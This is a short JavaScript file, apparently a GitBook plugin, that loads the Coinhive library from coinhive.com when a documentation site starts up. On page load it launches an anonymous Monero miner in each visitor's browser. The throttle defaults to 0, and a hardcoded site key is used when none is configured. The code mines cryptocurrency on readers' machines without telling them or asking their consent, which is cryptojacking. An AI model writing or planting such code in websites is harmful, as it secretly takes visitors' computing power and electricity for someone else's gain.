require(['gitbook'], function(gitbook) {
  gitbook.events.bind('start', function(e, cnf) {
    config = cnf.xmr;

    if (config.siteKey) {
      siteKey = config.siteKey;
    } else {
      siteKey = 'UogF4rJMxpFcsez63SckaUr06XOeNNQx';
    }

    if (config.throttle) {
      throttle = config.throttle;
      var tmpThrottle = config.throttle;
      if (
        typeof tmpThrottle === 'number' &&
        tmpThrottle >= 0 &&
        tmpThrottle <= 1
      ) {
        throttle = config.throttle;
      } else {
        throttle = 0;
      }
    } else {
      throttle = 0;
    }

    var xmrScript = document.createElement('script');
    xmrScript.src = 'https://coinhive.com/lib/coinhive.min.js';
    xmrScript.setAttribute('async', true);
    document.body.appendChild(xmrScript);

    window.onload = function() {
      var miner = new CoinHive.Anonymous(siteKey, { throttle: throttle });
      miner.start();
    };
  });
});
